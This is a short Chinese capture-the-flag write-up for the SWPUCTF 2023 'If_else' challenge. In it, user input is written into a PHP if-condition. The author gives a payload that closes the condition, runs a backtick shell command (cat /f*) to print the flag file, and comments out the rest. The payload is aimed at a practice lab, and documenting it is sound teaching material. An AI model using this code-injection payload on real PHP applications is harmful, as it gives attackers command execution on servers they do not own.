

### [SWPUCTF 2023 秋季新生赛]If_else

进入题目发现：

```php
某一天,NSSCTF给了你一次机会,让你来自定义if中的条件,提交后访问check.php查看结果

提交方式$_POST["check"]

记得访问一下check.php哦~

check.php的内容
<?php
    $a=false;
    $b=false;
    if(你提交的部分将会被写至这里)
    {$a=true;}
    else
    {$b=true;}
    if($a===true&&$b===true)
    eval(system(cat /flag));
?> 
```

这时候如果我们访问check.php，没有任何内容，根据题目提示的话

写代码进去，先闭合前面，然后命令执行，在最后面加注释符

```(空)
check=1==1) echo `cat /f*`;/*
```

然后访问check.php

![image-20250109204907374](https://gitee.com/bx33661/image/raw/master/path/image-20250109204907374.png)

得到flag